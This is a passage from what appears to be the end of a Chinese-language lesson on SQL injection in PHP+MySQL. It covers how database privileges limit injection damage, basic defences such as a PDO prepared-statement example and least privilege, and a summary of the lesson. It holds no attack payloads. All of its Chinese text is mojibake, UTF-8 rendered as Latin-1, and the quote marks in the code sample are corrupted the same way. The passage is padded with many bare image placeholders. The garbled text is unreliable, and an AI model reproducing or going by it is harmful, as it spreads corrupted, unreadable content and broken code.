![](img/405616e6279047f0a8b81af09c2a96bc_314.png)

![](img/405616e6279047f0a8b81af09c2a96bc_316.png)

### æƒé™çš„æ ¸å¿ƒå½±å“

![](img/405616e6279047f0a8b81af09c2a96bc_318.png)

![](img/405616e6279047f0a8b81af09c2a96bc_320.png)

![](img/405616e6279047f0a8b81af09c2a96bc_322.png)

![](img/405616e6279047f0a8b81af09c2a96bc_324.png)

![](img/405616e6279047f0a8b81af09c2a96bc_326.png)

*   **æ•°æ®åº“ç”¨æˆ·æƒé™**æ˜¯å†³å®šæ³¨å…¥å±å®³ç¨‹åº¦çš„å…³é”®ã€‚
    *   **é«˜æƒé™ç”¨æˆ·ï¼ˆå¦‚rootï¼‰ï¼š** å¯è¿›è¡Œè·¨åº“æŸ¥è¯¢ã€æ–‡ä»¶è¯»å†™ï¼Œå±å®³æå¤§ã€‚
    *   **ä½æƒé™ç”¨æˆ·ï¼š** é€šå¸¸åªèƒ½å½±å“å½“å‰æ•°æ®åº“ï¼Œå±å®³ç›¸å¯¹å¯æ§ã€‚
*   **æ¶æ„æ¨¡å¼é€‰æ‹©**ç›´æ¥å½±å“æ•°æ®åº“ç”¨æˆ·æƒé™çš„åˆ†é…ã€‚
    *   ä¸ºæ¯ä¸ªåº”ç”¨åˆ†é…ç‹¬ç«‹çš„ã€æƒé™æœ€å°çš„æ•°æ®åº“ç”¨æˆ·ï¼Œæ˜¯æœ‰æ•ˆçš„å®‰å…¨å®è·µã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_328.png)

![](img/405616e6279047f0a8b81af09c2a96bc_329.png)

### åŸºç¡€é˜²å¾¡æªæ–½

1.  **ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼ˆå‚æ•°åŒ–æŸ¥è¯¢ï¼‰ï¼š** è¿™æ˜¯æœ€æœ‰æ•ˆã€æœ€æ ¹æœ¬çš„é˜²å¾¡æ‰‹æ®µã€‚ç¡®ä¿ç”¨æˆ·è¾“å…¥æ°¸è¿œä¸è¢«è§£é‡Šä¸ºSQLä»£ç çš„ä¸€éƒ¨åˆ†ã€‚
    ```php
    // PDO ç¤ºä¾‹
    $stmt = $pdo->prepare(â€˜SELECT * FROM users WHERE email = :emailâ€™);
    $stmt->execute([â€˜emailâ€™ => $email]);
    ```
2.  **å¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’Œè½¬ä¹‰ï¼š** å¦‚æœå¿…é¡»æ‹¼æ¥SQLï¼ŒåŠ¡å¿…ä½¿ç”¨æ•°æ®åº“é©±åŠ¨æä¾›çš„ä¸“ç”¨è½¬ä¹‰å‡½æ•°ï¼ˆå¦‚`mysqli_real_escape_string`ï¼‰ã€‚
3.  **æœ€å°æƒé™åŸåˆ™ï¼š** åº”ç”¨ç¨‹åºè¿æ¥æ•°æ®åº“æ—¶ï¼Œä½¿ç”¨ä»…èƒ½æ»¡è¶³å…¶åŠŸèƒ½éœ€æ±‚çš„æœ€ä½æƒé™ç”¨æˆ·ã€‚
4.  **å…³é—­é”™è¯¯å›æ˜¾ï¼š** é¿å…å°†æ•°æ®åº“é”™è¯¯ä¿¡æ¯ï¼ˆå¯èƒ½åŒ…å«è·¯å¾„ã€SQLè¯­å¥ç‰‡æ®µï¼‰ç›´æ¥å±•ç¤ºç»™ç”¨æˆ·ã€‚
5.  **ä½¿ç”¨Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰ï¼š** å¯ä»¥å¸®åŠ©æ‹¦æˆªä¸€äº›å¸¸è§çš„æ³¨å…¥æ”»å‡»payloadã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_331.png)

![](img/405616e6279047f0a8b81af09c2a96bc_333.png)

---

![](img/405616e6279047f0a8b81af09c2a96bc_335.png)

![](img/405616e6279047f0a8b81af09c2a96bc_337.png)

![](img/405616e6279047f0a8b81af09c2a96bc_339.png)

![](img/405616e6279047f0a8b81af09c2a96bc_340.png)

![](img/405616e6279047f0a8b81af09c2a96bc_342.png)

![](img/405616e6279047f0a8b81af09c2a96bc_344.png)

## æ€»ç»“ ğŸ“

![](img/405616e6279047f0a8b81af09c2a96bc_346.png)

![](img/405616e6279047f0a8b81af09c2a96bc_348.png)

![](img/405616e6279047f0a8b81af09c2a96bc_350.png)

![](img/405616e6279047f0a8b81af09c2a96bc_352.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬ç³»ç»Ÿåœ°å­¦ä¹ äº†ï¼š
1.  **PHP+MySQLçš„ä¸¤ç§æ¶æ„æ¨¡å¼**åŠå…¶å®‰å…¨å«ä¹‰ã€‚
2.  **SQLæ³¨å…¥çš„æ ¹æœ¬åŸç†**ï¼šç”¨æˆ·è¾“å…¥æœªç»å¤„ç†ç›´æ¥æ‹¼æ¥è‡³SQLè¯­å¥ã€‚
3.  **åˆ©ç”¨`information_schema`** è¿›è¡Œç³»ç»ŸåŒ–çš„ä¿¡æ¯æ”¶é›†å’Œæ•°æ®çªƒå–ã€‚
4.  **é«˜æƒé™ä¸‹çš„é«˜çº§æ“ä½œ**ï¼šè·¨åº“æŸ¥è¯¢å’Œæ–‡ä»¶è¯»å†™ï¼Œå¹¶åˆ†æäº†å…¶ä¾èµ–æ¡ä»¶ã€‚
5.  **æƒé™çš„æ ¸å¿ƒé‡è¦æ€§**ä»¥åŠåŸºç¡€çš„é˜²å¾¡ç†å¿µã€‚

![](img/405616e6279047f0a8b81af09c2a96bc_354.png)

![](img/405616e6279047f0a8b81af09c2a96bc_356.png)

![](img/405616e6279047f0a8b81af09c2a96bc_358.png)

![](img/405616e6279047f0a8b81af09c2a96bc_360.png)

SQLæ³¨å…¥è™½ç„¶æ˜¯ä¸€ç§â€œå¤è€â€çš„æ¼æ´ï¼Œä½†å…¶åŸç†æ˜¯ç†è§£è®¸å¤šWebå®‰å…¨é—®é¢˜çš„åŸºçŸ³ã€‚ç†è§£æ”»å‡»ï¼Œæ˜¯ä¸ºäº†æ›´å¥½åœ°é˜²å¾¡ã€‚åœ¨åç»­è¯¾ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†ç»§ç»­æ¢è®¨å…¶ä»–ç±»å‹çš„æ¼æ´å’Œæ›´å¤æ‚çš„ç»•è¿‡æŠ€æœ¯ã€‚